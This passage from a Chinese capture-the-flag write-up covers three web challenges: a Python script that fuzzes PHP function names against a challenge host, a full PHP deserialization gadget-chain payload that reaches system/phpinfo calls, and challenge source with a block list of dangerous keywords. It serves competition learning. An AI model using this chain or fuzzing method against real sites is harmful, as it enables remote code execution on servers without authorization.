stream_set_blocking socket_set_blocking stream_get_meta_data stream_get_line stream_wrapper_register stream_register_wrapper stream_wrapper_unregister stream_wrapper_restore stream_get_wrappers stream_get_transports stream_resolve_include_path stream_is_local get_headers stream_set_timeout socket_set_timeout socket_get_status realpath fnmatch fsockopen pfsockopen pack unpack get_browser crypt opendir closedir chdir getcwd rewinddir readdir dir scandir glob fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype file_exists is_writable is_writeable is_readable is_executable is_file is_dir is_link stat lstat chown chgrp chmod touch clearstatcache disk_total_space disk_free_space diskfreespace realpath_cache_size realpath_cache_get mail ezmlm_hash openlog syslog closelog lcg_value metaphone ob_start ob_flush ob_clean ob_end_flush ob_end_clean ob_get_flush ob_get_clean ob_get_length ob_get_level ob_get_status ob_get_contents ob_implicit_flush ob_list_handlers ksort krsort natsort natcasesort asort arsort sort rsort usort uasort uksort shuffle array_walk array_walk_recursive count end prev next reset current key min max in_array array_search extract compact array_fill array_fill_keys range array_multisort array_push array_pop array_shift array_unshift array_splice array_slice array_merge array_merge_recursive array_replace array_replace_recursive array_keys array_values array_count_values array_column array_reverse array_reduce array_pad array_flip array_change_key_case array_rand array_unique array_intersect array_intersect_key array_intersect_ukey array_uintersect array_intersect_assoc array_uintersect_assoc array_intersect_uassoc array_uintersect_uassoc array_diff array_diff_key array_diff_ukey array_udiff array_diff_assoc array_udiff_assoc array_diff_uassoc array_udiff_uassoc array_sum array_product array_filter array_map array_chunk array_combine array_key_exists pos sizeof key_exists assert assert_options version_compare str_rot13 stream_get_filters stream_filter_register stream_bucket_make_writeable stream_bucket_prepend stream_bucket_append stream_bucket_new output_add_rewrite_var output_reset_rewrite_vars sys_get_temp_dir token_get_all token_name zip_open zip_close zip_read zip_entry_open zip_entry_close zip_entry_read zip_entry_filesize zip_entry_name zip_entry_compressedsize zip_entry_compressionmethod readgzfile gzrewind gzclose gzeof gzgetc gzgets gzgetss gzread gzopen gzpassthru gzseek gztell gzwrite gzputs gzfile gzcompress gzuncompress gzdeflate gzinflate gzencode gzdecode zlib_encode zlib_decode zlib_get_coding_type ob_gzhandler libxml_set_streams_context libxml_use_internal_errors libxml_get_last_error libxml_clear_errors libxml_get_errors libxml_disable_entity_loader libxml_set_external_entity_loader dom_import_simplexml pdo_drivers simplexml_load_file simplexml_load_string simplexml_import_dom wddx_serialize_value wddx_serialize_vars wddx_packet_start wddx_packet_end wddx_add_vars wddx_deserialize xml_parser_create xml_parser_create_ns xml_set_object xml_set_element_handler xml_set_character_data_handler xml_set_processing_instruction_handler xml_set_default_handler xml_set_unparsed_entity_decl_handler xml_set_notation_decl_handler xml_set_external_entity_ref_handler xml_set_start_namespace_decl_handler xml_set_end_namespace_decl_handler xml_parse xml_parse_into_struct xml_get_error_code xml_error_string xml_get_current_line_number xml_get_current_column_number xml_get_current_byte_index xml_parser_free xml_parser_set_option xml_parser_get_option utf8_encode utf8_decode xmlwriter_open_uri xmlwriter_open_memory xmlwriter_set_indent xmlwriter_set_indent_string xmlwriter_start_comment xmlwriter_end_comment xmlwriter_start_attribute xmlwriter_end_attribute xmlwriter_write_attribute xmlwriter_start_attribute_ns xmlwriter_write_attribute_ns xmlwriter_start_element xmlwriter_end_element xmlwriter_full_end_element xmlwriter_start_element_ns xmlwriter_write_element xmlwriter_write_element_ns xmlwriter_start_pi xmlwriter_end_pi xmlwriter_write_pi xmlwriter_start_cdata xmlwriter_end_cdata xmlwriter_write_cdata xmlwriter_text xmlwriter_write_raw xmlwriter_start_document xmlwriter_end_document xmlwriter_write_comment xmlwriter_start_dtd xmlwriter_end_dtd xmlwriter_write_dtd xmlwriter_start_dtd_element xmlwriter_end_dtd_element xmlwriter_write_dtd_element xmlwriter_start_dtd_attlist xmlwriter_end_dtd_attlist xmlwriter_write_dtd_attlist xmlwriter_start_dtd_entity xmlwriter_end_dtd_entity xmlwriter_write_dtd_entity xmlwriter_output_memory xmlwriter_flush bzopen bzread bzwrite bzflush bzclose bzerrno bzerrstr bzerror bzcompress bzdecompress curl_init curl_copy_handle curl_version curl_setopt curl_setopt_array curl_exec curl_getinfo curl_error curl_errno curl_close curl_strerror curl_multi_strerror curl_reset curl_escape curl_unescape curl_pause curl_multi_init curl_multi_add_handle curl_multi_remove_handle curl_multi_select curl_multi_exec curl_multi_getcontent curl_multi_info_read curl_multi_close curl_multi_setopt curl_share_init curl_share_close curl_share_setopt curl_file_create gd_info imagearc imageellipse imagechar imagecharup imagecolorat imagecolorallocate imagepalettecopy imagecreatefromstring imagecolorclosest imagecolorclosesthwb imagecolordeallocate imagecolorresolve imagecolorexact imagecolorset imagecolortransparent imagecolorstotal imagecolorsforindex imagecopy imagecopymerge imagecopymergegray imagecopyresized imagecreate imagecreatetruecolor imageistruecolor imagetruecolortopalette imagepalettetotruecolor imagesetthickness imagefilledarc imagefilledellipse imagealphablending imagesavealpha imagecolorallocatealpha imagecolorresolvealpha imagecolorclosestalpha imagecolorexactalpha imagecopyresampled imagegrabwindow imagegrabscreen imagerotate imageflip imageantialias imagecrop imagecropauto imagescale imageaffine imageaffinematrixconcat imageaffinematrixget imagesetinterpolation imagesettile imagesetbrush imagesetstyle imagecreatefrompng imagecreatefromwebp imagecreatefromgif imagecreatefromjpeg imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm imagecreatefromgd imagecreatefromgd2 imagecreatefromgd2part imagepng imagewebp imagegif imagejpeg imagewbmp imagegd imagegd2 imagedestroy imagegammacorrect imagefill imagefilledpolygon imagefilledrectangle imagefilltoborder imagefontwidth imagefontheight imageinterlace imageline imageloadfont imagepolygon imagerectangle imagesetpixel imagestring imagestringup imagesx imagesy imagedashedline imagettfbbox imagettftext imageftbbox imagefttext imagetypes jpeg2wbmp png2wbmp image2wbmp imagelayereffect imagexbm imagecolormatch imagefilter imageconvolution mb_convert_case mb_strtoupper mb_strtolower mb_language mb_internal_encoding mb_http_input mb_http_output mb_detect_order mb_substitute_character mb_parse_str mb_output_handler mb_preferred_mime_name mb_strlen mb_strpos mb_strrpos mb_stripos mb_strripos mb_strstr mb_strrchr mb_stristr mb_strrichr mb_substr_count mb_substr mb_strcut mb_strwidth mb_strimwidth mb_convert_encoding mb_detect_encoding mb_list_encodings mb_encoding_aliases mb_convert_kana mb_encode_mimeheader mb_decode_mimeheader mb_convert_variables mb_encode_numericentity mb_decode_numericentity mb_send_mail mb_get_info mb_check_encoding mb_regex_encoding mb_regex_set_options mb_ereg mb_eregi mb_ereg_replace mb_eregi_replace mb_ereg_replace_callback mb_split mb_ereg_match mb_ereg_search mb_ereg_search_pos mb_ereg_search_regs mb_ereg_search_init mb_ereg_search_getregs mb_ereg_search_getpos mb_ereg_search_setpos mbregex_encoding mbereg mberegi mbereg_replace mberegi_replace mbsplit mbereg_match mbereg_search mbereg_search_pos mbereg_search_regs mbereg_search_init mbereg_search_getregs mbereg_search_getpos mbereg_search_setpos mysql_connect mysql_pconnect mysql_close mysql_select_db mysql_query mysql_unbuffered_query mysql_db_query mysql_list_dbs mysql_list_tables mysql_list_fields mysql_list_processes mysql_error mysql_errno mysql_affected_rows mysql_insert_id mysql_result mysql_num_rows mysql_num_fields mysql_fetch_row mysql_fetch_array mysql_fetch_assoc mysql_fetch_object mysql_data_seek mysql_fetch_lengths mysql_fetch_field mysql_field_seek mysql_free_result mysql_field_name mysql_field_table mysql_field_len mysql_field_type mysql_field_flags mysql_escape_string mysql_real_escape_string mysql_stat mysql_thread_id mysql_client_encoding mysql_ping mysql_get_client_info mysql_get_host_info mysql_get_proto_info mysql_get_server_info mysql_info mysql_set_charset mysql mysql_fieldname mysql_fieldtable mysql_fieldlen mysql_fieldtype mysql_fieldflags mysql_selectdb mysql_freeresult mysql_numfields mysql_numrows mysql_listdbs mysql_listtables mysql_listfields mysql_db_name mysql_dbname mysql_tablename mysql_table_name mysqli_affected_rows mysqli_autocommit mysqli_begin_transaction mysqli_change_user mysqli_character_set_name mysqli_close mysqli_commit mysqli_connect mysqli_connect_errno mysqli_connect_error mysqli_data_seek mysqli_dump_debug_info mysqli_debug mysqli_errno mysqli_error mysqli_error_list mysqli_stmt_execute mysqli_execute mysqli_fetch_field mysqli_fetch_fields mysqli_fetch_field_direct mysqli_fetch_lengths mysqli_fetch_all mysqli_fetch_array mysqli_fetch_assoc mysqli_fetch_object mysqli_fetch_row mysqli_field_count mysqli_field_seek mysqli_field_tell mysqli_free_result mysqli_get_connection_stats mysqli_get_client_stats mysqli_get_charset mysqli_get_client_info mysqli_get_client_version mysqli_get_host_info mysqli_get_proto_info mysqli_get_server_info mysqli_get_server_version mysqli_get_warnings mysqli_init mysqli_info mysqli_insert_id mysqli_kill mysqli_more_results mysqli_multi_query mysqli_next_result mysqli_num_fields mysqli_num_rows mysqli_options mysqli_ping mysqli_poll mysqli_prepare mysqli_report mysqli_query mysqli_real_connect mysqli_real_escape_string mysqli_real_query mysqli_reap_async_query mysqli_release_savepoint mysqli_rollback mysqli_savepoint mysqli_select_db mysqli_set_charset mysqli_stmt_affected_rows mysqli_stmt_attr_get mysqli_stmt_attr_set mysqli_stmt_bind_param mysqli_stmt_bind_result mysqli_stmt_close mysqli_stmt_data_seek mysqli_stmt_errno mysqli_stmt_error mysqli_stmt_error_list mysqli_stmt_fetch mysqli_stmt_field_count mysqli_stmt_free_result mysqli_stmt_get_result mysqli_stmt_get_warnings mysqli_stmt_init mysqli_stmt_insert_id mysqli_stmt_more_results mysqli_stmt_next_result mysqli_stmt_num_rows mysqli_stmt_param_count mysqli_stmt_prepare mysqli_stmt_reset mysqli_stmt_result_metadata mysqli_stmt_send_long_data mysqli_stmt_store_result mysqli_stmt_sqlstate mysqli_sqlstate mysqli_ssl_set mysqli_stat mysqli_store_result mysqli_thread_id mysqli_thread_safe mysqli_use_result mysqli_warning_count mysqli_refresh mysqli_escape_string mysqli_set_opt xdebug_get_stack_depth xdebug_get_function_stack xdebug_get_formatted_function_stack xdebug_print_function_stack xdebug_get_declared_vars xdebug_call_class xdebug_call_function xdebug_call_file xdebug_call_line xdebug_var_dump xdebug_debug_zval xdebug_debug_zval_stdout xdebug_enable xdebug_disable xdebug_is_enabled xdebug_break xdebug_start_trace xdebug_stop_trace xdebug_get_tracefile_name xdebug_get_profiler_filename xdebug_dump_aggr_profiling_data xdebug_clear_aggr_profiling_data xdebug_memory_usage xdebug_peak_memory_usage xdebug_time_index xdebug_start_error_collection xdebug_stop_error_collection xdebug_get_collected_errors xdebug_start_function_monitor xdebug_stop_function_monitor xdebug_get_monitored_functions xdebug_start_code_coverage xdebug_stop_code_coverage xdebug_get_code_coverage xdebug_code_coverage_started xdebug_get_function_count xdebug_dump_superglobals xdebug_get_headers dl cli_set_process_title cli_get_process_title </span><span class="hljs-string"></span><span class="hljs-string">&#x27;&#x27;&#x27;</span>s = s.split(<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-comment"># print s[0]</span><span class="hljs-comment"># print s</span><span class="hljs-comment"># con = requests.get(&#x27;http://eci-2zed3ztpomt9jfpdablo.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=&#x27;+s[0]).text</span><span class="hljs-comment"># print con</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:    con = requests.get(<span class="hljs-string">&#x27;http://eci-2zed3ztpomt9k9atz5n9.cloudeci1.ichunqiu.com/?a=&#x27;</span>+i).text    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> con:        <span class="hljs-comment"># if con != nothing:</span>        <span class="hljs-built_in">print</span> i        <span class="hljs-built_in">print</span> con.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</code></pre></div><p><strong>参考资料</strong>：</p><ul><li><a href="https://www.jc2182.com/php/php-pcntl-wifexited-ref.html">pcntl_wifexited 进程控制函数</a></li></ul><h2 id="web2：babyunserialize"><a href="#web2：babyunserialize" class="headerlink" title="web2：babyunserialize"></a>web2：babyunserialize</h2><p>这道题与WMCTF2020基本一致。</p><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul><li><p>类的数组动态调用</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;aaaa&quot;</span>;    &#125;&#125;<span class="hljs-variable">$tr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> A(),<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-variable">$tr</span>();<span class="hljs-comment">//这样就可以直接调用到A的test函数</span></code></pre></div></li><li><p>找到函数名与参数名均可控的点</p></li><li><p>反序列化数组的先后顺序</p></li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul><li><p>找到可以利用的__destuct函数，这里找的是CLI\Agent类。</p><ul><li><div class="hljs code-wrapper"><pre><code class="php">function __destruct() &#123;    if (isset($this-&gt;server-&gt;events[&#39;disconnect&#39;]) &amp;&amp;    is_callable($func=$this-&gt;server-&gt;events[&#39;disconnect&#39;]))    $func($this);&#125;<pre><code class="hljs php">这里可以利用对象与其成员方法的数组，调用任意对象的任意方法。`<span class="hljs-keyword">$this</span>-&gt;server-&gt;events[<span class="hljs-string">&#x27;disconnect&#x27;</span>] = <span class="hljs-keyword">array</span>(xxx类，xxx类的某个成员函数)`所以下一步就是寻找调用哪个方法。于wmctf 中的webweb一致，我们需要在这一个函数里找到这样一条语句：调用了某个函数，且函数名与函数参数可控的语句。在DB\Jig\Mapper中找到了update方法。```php<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-variable">$db</span>=<span class="hljs-keyword">$this</span>-&gt;db;<span class="hljs-variable">$now</span>=microtime(<span class="hljs-literal">TRUE</span>);<span class="hljs-variable">$data</span>=&amp;<span class="hljs-variable">$db</span>-&gt;read(<span class="hljs-keyword">$this</span>-&gt;file);....</code></pre></div>这里就相当于执行了\$this-&gt;db-&gt;read(\$this-&gt;file)我们可以控制上一步跳到这个函数里，\$this-&gt;db是可以控制的，我们可以控制\$this-&gt;db为一个类，调用read方法。如果read方法不存在即可触发__call，下一步寻找可用的\_\_call</code></pre></li></ul></li><li><p>可以考虑SQL\Mapper中的__call方法</p><ul><li><div class="hljs code-wrapper"><pre><code class="php">function __call($func,$args) &#123;        return call_user_func_array(            (array_key_exists($func,$this-&gt;props)?                $this-&gt;props[$func]:                $this-&gt;$func),$args        );&#125;<pre><code class="hljs php">    如果上一步触发这里的__call方法。\<span class="hljs-variable">$func</span>是可控的，并且<span class="hljs-variable">$args</span>就是我们上一步传进来的args。\<span class="hljs-keyword">$this</span>-&gt;props也是我们可控的。所以这一步我们可以控制\<span class="hljs-keyword">$this</span>-&gt;props[\<span class="hljs-variable">$func</span>].也就相当于执行了`call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;props[<span class="hljs-variable">$func</span>](<span class="hljs-variable">$args</span>))`.    结合上一步，这里\<span class="hljs-variable">$func</span>为<span class="hljs-string">&quot;read&quot;</span>，\<span class="hljs-variable">$args</span>为上一步的<span class="hljs-keyword">$this</span>-&gt;file。    所以我们可以使\<span class="hljs-keyword">$this</span>-&gt;props = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;read&quot;</span>=&gt;<span class="hljs-string">&quot;system&quot;</span>)的一个数组。上一步中的\<span class="hljs-keyword">$this</span>-&gt;file为<span class="hljs-string">&quot;whoami&quot;</span>即可执行。由于这道题flag在phpinfo中，所以控制read=&gt;phpinfo,<span class="hljs-keyword">$this</span>-&gt;file为INFO_ALL。        - 理清思路：  - ```php  <span class="hljs-variable">$SQLMapper</span>=<span class="hljs-keyword">new</span> DB\SQL\Mapper();  <span class="hljs-variable">$JigMapper</span>=<span class="hljs-keyword">new</span> DB\Jig\Mapper(<span class="hljs-variable">$SQLMapper</span>,INFO_ALL );  <span class="hljs-variable">$DBMongo</span>=<span class="hljs-keyword">new</span> DB\Mongo(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$JigMapper</span>,<span class="hljs-string">&quot;update&quot;</span>)));  <span class="hljs-variable">$Agent</span>=<span class="hljs-keyword">new</span> CLI\Agent(<span class="hljs-variable">$DBMongo</span>);  <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$Agent</span>));</code></pre></div>这里用DB\Mongo这一个新建的类进行中转。效果同样是控制\$this-&gt;server-&gt;events[&#39;disconnect&#39;]后面的array($JigMapper,&quot;update&quot;)</code></pre></li></ul></li></ul><ul><li><p>调试</p><ul><li><p>unserialize后进入autoload加载类。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>) </span>&#123;<span class="hljs-variable">$class</span>=<span class="hljs-keyword">$this</span>-&gt;fixslashes(ltrim(<span class="hljs-variable">$class</span>,<span class="hljs-string">&#x27;\\&#x27;</span>));<span class="hljs-comment">/** <span class="hljs-doctag">@var</span> callable $func */</span><span class="hljs-variable">$func</span>=<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$path</span>=<span class="hljs-keyword">$this</span>-&gt;hive[<span class="hljs-string">&#x27;AUTOLOAD&#x27;</span>]) &amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$path</span>[<span class="hljs-number">1</span>]) &amp;&amp; is_callable(<span class="hljs-variable">$path</span>[<span class="hljs-number">1</span>]))<span class="hljs-keyword">list</span>(<span class="hljs-variable">$path</span>,<span class="hljs-variable">$func</span>)=<span class="hljs-variable">$path</span>;<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;split(<span class="hljs-keyword">$this</span>-&gt;hive[<span class="hljs-string">&#x27;PLUGINS&#x27;</span>].<span class="hljs-string">&#x27;;&#x27;</span>.<span class="hljs-variable">$path</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$auto</span>)<span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> &amp;&amp; is_file(<span class="hljs-variable">$file</span>=<span class="hljs-variable">$func</span>(<span class="hljs-variable">$auto</span>.<span class="hljs-variable">$class</span>).<span class="hljs-string">&#x27;.php&#x27;</span>) ||is_file(<span class="hljs-variable">$file</span>=<span class="hljs-variable">$auto</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.php&#x27;</span>) ||is_file(<span class="hljs-variable">$file</span>=<span class="hljs-variable">$auto</span>.strtolower(<span class="hljs-variable">$class</span>).<span class="hljs-string">&#x27;.php&#x27;</span>) ||is_file(<span class="hljs-variable">$file</span>=strtolower(<span class="hljs-variable">$auto</span>.<span class="hljs-variable">$class</span>).<span class="hljs-string">&#x27;.php&#x27;</span>))<span class="hljs-keyword">return</span> <span class="hljs-keyword">require</span>(<span class="hljs-variable">$file</span>);&#125;</code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200825080802566.png#pic_center" alt="在这里插入图片描述"></p></li></ul></li></ul><p>这一句判断是否存在agent.php，但是cil目录下是没有agent.php文件的。所以这里没有将Agent类包含进来，也就无法正常反序列化。</p><p><img src="https://img-blog.csdnimg.cn/2020082508084047.png#pic_center" alt="在这里插入图片描述"></p><ul><li>解决办法：由于ws.php是存在的，而Agent类也是在ws.php中，我们只需要在Agent类反序列化前先反序列化一个ws类，即可将Agent类引入。做法是反序列化一个数组：<code>serialize(array(new WS(),new Agent()))</code></li></ul><p>结合以上，得到如下payload，参考了wmctf webweb官方writeup。</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;?phpnamespace CLI&#123;    class Agent    &#123;        protected <span class="hljs-variable">$server</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$server</span>)        &#123;            <span class="hljs-variable">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;        &#125;    &#125;    class WS    &#123;    &#125;&#125;namespace DB&#123;    abstract class Cursor  implements \IteratorAggregate &#123;&#125;    class Mongo &#123;        public <span class="hljs-variable">$events</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$events</span>)        &#123;            <span class="hljs-variable">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;        &#125;    &#125;&#125;namespace DB\Jig&#123;    class Mapper extends \DB\Cursor &#123;        protected <span class="hljs-variable">$legacy</span>=0;        protected <span class="hljs-variable">$db</span>;        protected <span class="hljs-variable">$file</span>;        <span class="hljs-keyword">function</span> offsetExists(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetGet(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetSet(<span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetUnset(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">getIterator</span></span>()&#123;&#125;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$file</span>)&#123;            <span class="hljs-variable">$this</span>-&gt;db=<span class="hljs-variable">$db</span>;            <span class="hljs-variable">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;        &#125;    &#125;&#125;namespace DB\SQL&#123;    class Mapper extends \DB\Cursor&#123;        protected <span class="hljs-variable">$props</span>=[<span class="hljs-string">&quot;read&quot;</span>=&gt;<span class="hljs-string">&quot;phpinfo&quot;</span>];        <span class="hljs-keyword">function</span> offsetExists(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetGet(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetSet(<span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span>)&#123;&#125;        <span class="hljs-keyword">function</span> offsetUnset(<span class="hljs-variable">$offset</span>)&#123;&#125;        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">getIterator</span></span>()&#123;&#125;    &#125;&#125;namespace&#123;    <span class="hljs-variable">$SQLMapper</span>=new DB\SQL\Mapper();//    <span class="hljs-built_in">echo</span> serialize(<span class="hljs-variable">$SQLMapper</span>),<span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-variable">$JigMapper</span>=new DB\Jig\Mapper(<span class="hljs-variable">$SQLMapper</span>,INFO_ALL );//    <span class="hljs-variable">$MongoMapper</span>  = new CLI\WS();    <span class="hljs-variable">$DBMongo</span>=new DB\Mongo(array(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;array(<span class="hljs-variable">$JigMapper</span>,<span class="hljs-string">&quot;update&quot;</span>)));    <span class="hljs-variable">$Agent</span>=new CLI\Agent(<span class="hljs-variable">$DBMongo</span>);    <span class="hljs-variable">$WS</span>=new CLI\WS();    <span class="hljs-built_in">echo</span> urlencode(serialize(array(<span class="hljs-variable">$WS</span>,<span class="hljs-variable">$Agent</span>)));&#125;</code></pre></div><h2 id="web3：rceme"><a href="#web3：rceme" class="headerlink" title="web3：rceme"></a>web3：rceme</h2><p>参考：</p><ul><li><a href="https://www.anquanke.com/post/id/173991#h2-5">https://www.anquanke.com/post/id/173991#h2-5</a></li></ul><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);parserIfLabel(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">danger_key</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;    <span class="hljs-variable">$s</span>=htmlspecialchars(<span class="hljs-variable">$s</span>);    <span class="hljs-variable">$key</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;preg&#x27;</span>,<span class="hljs-string">&#x27;server&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;md5&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;sql&#x27;</span>,<span class="hljs-string">&#x27;mkdir&#x27;</span>,<span class="hljs-string">&#x27;copy&#x27;</span>,<span class="hljs-string">&#x27;fwrite&#x27;</span>,<span class="hljs-string">&#x27;del&#x27;</span>,<span class="hljs-string">&#x27;encrypt&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>,<span class="hljs-string">&#x27;ini_&#x27;</span>,<span class="hljs-string">&#x27;chroot&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;require&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;create&#x27;</span>,<span class="hljs-string">&#x27;func&#x27;</span>,<span class="hljs-string">&#x27;symlink&#x27;</span>,<span class="hljs-string">&#x27;sleep&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;str&#x27;</span>,<span class="hljs-string">&#x27;source&#x27;</span>,<span class="hljs-string">&#x27;rev&#x27;</span>,<span class="hljs-string">&#x27;base_convert&#x27;</span>);    <span class="hljs-variable">$s</span> = str_ireplace(<span class="hljs-variable">$key</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-variable">$s</span>);    <span class="hljs-variable">$danger</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;preg&#x27;</span>,<span class="hljs-string">&#x27;server&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;md5&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;sql&#x27;</span>,<span class="hljs-string">&#x27;mkdir&#x27;</span>,<span class="hljs-string">&#x27;copy&#x27;</span>,<span class="hljs-string">&#x27;fwrite&#x27;</span>,<span class="hljs-string">&#x27;del&#x27;</span>,<span class="hljs-string">&#x27;encrypt&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>,<span class="hljs-string">&#x27;ini_&#x27;</span>,<span class="hljs-string">&#x27;chroot&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;require&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;create&#x27;</span>,<span class="hljs-string">&#x27;func&#x27;</span>,<span class="hljs-string">&#x27;symlink&#x27;</span>,<span class="hljs-string">&#x27;sleep&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;str&#x27;</span>,<span class="hljs-string">&#x27;source&#x27;</span>,<span class="hljs-string">&#x27;rev&#x27;</span>,<span class="hljs-string">&#x27;base_convert&#x27;</span>);    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$danger</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>)&#123;        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$s</span>,<span class="hljs-variable">$val</span>) !==<span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.<span class="hljs-variable">$val</span>.<span class="hljs-string">&#x27;】&#x27;</span>);        &#125;    &#125;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/^[a-z]$/i&quot;</span>))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;&#125;<span 